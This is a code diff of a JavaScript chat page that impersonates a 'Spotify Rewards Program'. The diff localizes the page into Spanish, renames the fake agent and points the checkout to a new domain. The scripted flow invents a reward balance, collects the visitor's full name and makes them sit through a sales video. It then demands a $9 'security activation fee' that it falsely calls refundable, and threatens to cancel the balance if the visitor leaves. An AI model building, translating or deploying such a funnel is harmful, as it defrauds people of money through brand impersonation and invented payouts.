@@ -30,11 +30,11 @@
     document.head.appendChild(s);
   </script>
   <!-- VTurb Video 1 Preloads -->
-  <link rel="preload" href="https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6ae8cef1c3ff612f67d6e004/v4/embed.html" as="document">
+  <link rel="preload" href="https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6b0872968bc4ca7b4a00a9f0/v4/embed.html" as="document">
   <link rel="preload" href="https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6ae8cef1c3ff612f67d6e004/v4/player.js" as="script">
   <link rel="preload" href="https://cdn.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/6ae8ceedc3ff612f67d6dffb/main.m3u8" as="fetch">
   <!-- VTurb Video 2 Preloads -->
-  <link rel="preload" href="https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6ae8cf1fc7321bec2b429188/v4/embed.html" as="document">
+  <link rel="preload" href="https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6b087560e40e5c9502f0f66f/v4/embed.html" as="document">
   <link rel="preload" href="https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6ae8cf1fc7321bec2b429188/v4/player.js" as="script">
   <link rel="preload" href="https://cdn.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/6ae8cf0aafbe3cdd0427c2dd/main.m3u8" as="fetch">
   <!-- DNS Prefetches -->
@@ -530,6 +530,17 @@
   <link rel="dns-prefetch" href="https://bot.type-bot.online">
   <link rel="preload" as="image" href="/sp/type/avatar.png">
 
+  <script>!function(i,n){i._plt=i._plt||(n&&n.timeOrigin?n.timeOrigin+n.now():Date.now())}(window,performance);</script>
+  <link rel="preload" href="https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6b0872968bc4ca7b4a00a9f0/v4/player.js" as="script">
+  <link rel="preload" href="https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6b087560e40e5c9502f0f66f/v4/player.js" as="script">
+  <link rel="preload" href="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/smartplayer.js" as="script">
+  <link rel="preload" href="https://cdn.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/6b08728fd111561ff54aad2e/main.m3u8" as="fetch">
+  <link rel="preload" href="https://cdn.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/6b0875413e4b2acbe02e7a9f/main.m3u8" as="fetch">
+  <link rel="dns-prefetch" href="https://cdn.converteai.net">
+  <link rel="dns-prefetch" href="https://scripts.converteai.net">
+  <link rel="dns-prefetch" href="https://images.converteai.net">
+  <link rel="dns-prefetch" href="https://license.vturb.com">
+
 </head>
 
 <body>
@@ -707,7 +718,7 @@
       var agentNameEl = document.getElementById('agentName');
       var vars = { nome: '', balance: parseFloat(balanceVal).toFixed(2) };
 
-      var CHECKOUT = 'https://checkout.lumexapps.com/';
+      var CHECKOUT = 'https://checkout.spotmusic.app/';
 
       function fill(t) {
         return t.replace(/\{\{(\w+)\}\}/g, function (_, k) {
@@ -760,7 +771,7 @@
 
       function activateRepresentative() {
         AV = '/sp/type/avatar.png';
-        agentName = 'Kaytlynn W.';
+        agentName = 'Sofia';
         agentAvatar.src = AV;
         agentAvatar.alt = agentName;
         agentAvatar.classList.remove('support-logo');
@@ -937,57 +948,57 @@
         // Etapa 01
         step('chegou_vsl');
         step('comeco');
-        await say('To begin your service, your case number is 809821');
+        await say('Para iniciar tu atención, tu número de caso es 809821');
         await sleep(4000);
-        await say("You've been one of the few people selected for the Spotify Rewards Program");
+        await say("Has sido una de las pocas personas seleccionadas para el Programa de Recompensas de Spotify");
         await sleep(3000);
-        await say("We've selected five songs for you to listen to and rate. It takes just a couple of minutes.");
+        await say("Hemos seleccionado cinco canciones para que escuches y califiques. Solo toma un par de minutos.");
         step('avaliacao1');
         media('/sp/songs/index.html', 355);
         await waitForSongs(600000);
         await sleep(3000);
-        await say('Click the button below to continue with your registration.');
+        await say('Haz clic en el botón de abajo para continuar con tu registro.');
         await sleep(3000);
 
         // Etapa 02
-        await askButton('Start Verification');
+        await askButton('Comenzar Verificación');
         step('start_verification1');
         step('iniciouspt');
         await sleep(2000);
         activateRepresentative();
-        await sayStatus('Kaytlynn, the Spotify Rewards representative, has joined the chat', 'success');
+        await sayStatus('Sofia, la representante oficial de Spotify Rewards, se ha unido al chat', 'success');
         await sleep(4000);
-        await say('Hi, welcome to the Spotify Rewards!');
+        await say('¡Hola! ¡Te damos la bienvenida a Spotify Rewards!');
         await sleep(3000);
-        media('https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6ae8cef1c3ff612f67d6e004/v4/embed.html', 620);
+        media('https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6b0872968bc4ca7b4a00a9f0/v4/embed.html', 620);
         await sleep(27000);
-        await say('You have a balance of ${{balance}} in our app');
+        await say('Tienes un saldo acumulado de ${{balance}} en nuestra aplicación');
         await sleep(3000);
-        await say('Would you like to continue so you can withdraw your money?');
-        await say('(Click the button below to continue)');
-        await askButton('Yes, I would like to withdraw');
+        await say('¿Deseas continuar para poder retirar tu dinero?');
+        await say('(Haz clic en el botón de abajo para continuar)');
+        await askButton('Sí, quiero retirar');
 
         // Etapa 03
-        await say("Would you like to receive your reward for the work you've done?");
-        await say('(Click the button below to continue)');
-        await askButton('Yes, I do!');
+        await say("¿Deseas recibir tu recompensa por las canciones evaluadas?");
+        await say('(Haz clic en el botón de abajo para continuar)');
+        await askButton('¡Sí, la quiero!');
         step('yes_i_do1');
 
         // Etapa 04 - name
         step('coleta_de_nome1');
-        await sayStatus("Okay, I'll continue with your registration.", 'success');
+        await sayStatus("Muy bien, voy a continuar con tu registro.", 'success');
         await sleep(3000);
-        await say("At this stage, I need you to tell me your name so I can verify that you're a new user.");
+        await say("En esta etapa, necesito que me digas tu nombre para verificar que eres un usuario nuevo.");
         await sleep(3000);
-        await say('What is your full name?');
-        await say('(Write below)');
-        vars.nome = await askText('Enter your name here...');
-        var checkingRow = await sayStatus('Checking...', 'pending');
+        await say('¿Cuál es tu nombre completo?');
+        await say('(Escríbelo abajo)');
+        vars.nome = await askText('Escribe tu nombre aquí...');
+        var checkingRow = await sayStatus('Verificando...', 'pending');
         await sleep(6000);
 
         // Etapa 05
         step('elegibilidade1');
-        await updateStatus(checkingRow, 'Just a moment...', 'pending');
+        await updateStatus(checkingRow, 'Solo un momento...', 'pending');
         await sleep(10000);
         await updateStatus(checkingRow, 'Everything looks good, {{nome}}!\n\nI checked our system and saw that you are eligible to receive your commission of ${{balance}}', 'success');
 
@@ -996,9 +1007,9 @@
         await sleep(3000);
         await say('I\u2019m sending you the receipt for your commissions.');
         await sleep(1000);
-        var receiptLoadingRow = await sayStatus('Loading...', 'pending');
+        var receiptLoadingRow = await sayStatus('Cargando...', 'pending');
         await sleep(4000);
-        await updateStatus(receiptLoadingRow, 'Generating your commission withdrawal receipt...', 'pending');
+        await updateStatus(receiptLoadingRow, 'Generando el recibo de retiro de tus comisiones...', 'pending');
         await sleep(4000);
         var receiptFrame = media('/sp/receipt/index.html?nome=' + encodeURIComponent(vars.nome) + '&total=' + encodeURIComponent((currentBalance > 0 ? currentBalance : parseFloat(balanceVal)).toFixed(2)), 440);
         receiptFrame.className = 'withdraw-receipt';
@@ -1016,25 +1027,25 @@
         await sleep(4000);
 
         // Etapa 07
-        await say('(Click the button below to continue)');
-        await askButton('I want to claim my reward');
+        await say('(Haz clic en el botón de abajo para continuar)');
+        await askButton('Quiero reclamar mi recompensa');
         step('vslspt');
 
         // VSL + oferta
         step('vsl_checkout1');
-        await sayStatus('Your access to withdraw your commission will be granted after this short explanatory video', 'alert');
-        player('https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6ae8cf1fc7321bec2b429188/v4/embed.html', 56.25);
+        await sayStatus('Tu acceso para retirar tu comisión será liberado después de este breve video explicativo', 'alert');
+        player('https://scripts.converteai.net/931eeb7b-5913-4bed-9f92-d2eb24bc2892/players/6b087560e40e5c9502f0f66f/v4/embed.html', 56.25);
         var __h = location.hostname;
         var __isDev = __h === 'localhost' || __h === '127.0.0.1' || __h.indexOf('id-preview--') === 0 || __h.indexOf('-dev.lovable.app') > -1 || __h.indexOf('.lovableproject.com') > -1 || __h.indexOf('.sandbox.lovable.dev') > -1 || new URLSearchParams((window.spTrackingSearch || location.search)).get('dev') === '1';
         await sleep(__isDev ? 0 : 260000);
         step('assistiu_pitch');
         await sayStatus('Your balance of ${{balance}} is ready!\n\nTo withdraw your earnings today, all you need to do is pay a small security activation fee of $9.00\n\nThis is to verify your account and ensure that you are not a bot.', 'reward');
         await sleep(5000);
-        await sayStatus('Please note: The fee will be fully refunded after registration, along with your current balance of ${{balance}}', 'alert');
+        await sayStatus('Ten en cuenta: Esta tarifa es 100% reembolsable inmediatamente después del registro, junto con tu saldo acumulado de ${{balance}}', 'alert');
         await sleep(4000);
         await say('This is a unique opportunity.\n\nIf you decide to leave now, your balance will be canceled and transferred to another user on the waiting list.');
         await sleep(3000);
-        await say('You are being redirected to the payment page...');
+        await say('Te estamos redirigiendo a la página segura de pago...');
         step('clicou_botao');
         step('checkoutspt');
         step('checkout1');
